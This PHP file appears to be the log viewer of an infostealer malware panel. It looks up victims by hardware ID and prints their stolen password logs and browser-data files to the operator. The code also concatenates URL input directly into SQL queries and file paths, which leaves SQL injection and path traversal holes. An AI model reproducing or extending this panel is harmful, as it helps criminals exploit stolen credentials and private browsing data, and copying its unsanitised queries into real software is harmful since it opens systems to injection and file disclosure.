<?php
   session_start();
   include 'database.php';
	require_once("auth.php");
   if(isset($_GET['passwords'])){
	   $password = $_GET['passwords'];
	   $f = $pdoConnection->query("SELECT id, hwid FROM `logs` WHERE id = ".$password)->fetch(PDO::FETCH_ASSOC);
	   $file = str_replace("\n","<br>",file_get_contents('logs/'.$f['hwid'].'/passwords.log'));
	   if($file==""){
		   echo "Nothing";
	   }else{
		   echo $file;
	   }
   }else if(isset($_GET['browsers'])){
	   $browsers = $_GET['browsers'];
	   $f = $pdoConnection->query("SELECT id, hwid FROM `logs` WHERE id = ".$browsers)->fetch(PDO::FETCH_ASSOC);
	   if(isset($_GET['file'])){
		   $file = str_replace("\n","<br>",file_get_contents('logs/'.$f['hwid'].'/Browsers/'.$_GET['file']));
	   if($file==""){
		   echo "Nothing";
	   }else{
		   echo $file;
	   }
	   die();
	   }
	   if(file_exists("logs/".$f['hwid']."/Browsers")) $dir = scandir("logs/".$f['hwid']."/Browsers"); else echo "Nothing";
	   foreach($dir as $file){
		   echo '<a href="viewer.php?browsers='.$browsers.'&file='.$file.'">'.$file.'</a><br>';
	   }
   }
?>